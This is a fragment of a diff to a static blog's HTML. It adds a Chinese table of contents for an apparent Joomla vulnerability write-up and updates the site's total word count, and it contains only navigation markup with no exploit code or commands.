+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件背景"><span class="nav-number">1.</span> <span class="nav-text">#事件背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响范围"><span class="nav-number">2.</span> <span class="nav-text">#影响范围</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">#漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp攻击链分析"><span class="nav-number">4.</span> <span class="nav-text">#Exp攻击链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">5.</span> <span class="nav-text">#漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">6.</span> <span class="nav-text">#修复建议</span></a></li></ol></div>
             
 
           </div>
@@ -836,7 +827,7 @@ https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">9k</span>
+    <span title="Site words total count">9.1k</span>
   
 </div>
 <div class="powered-by">
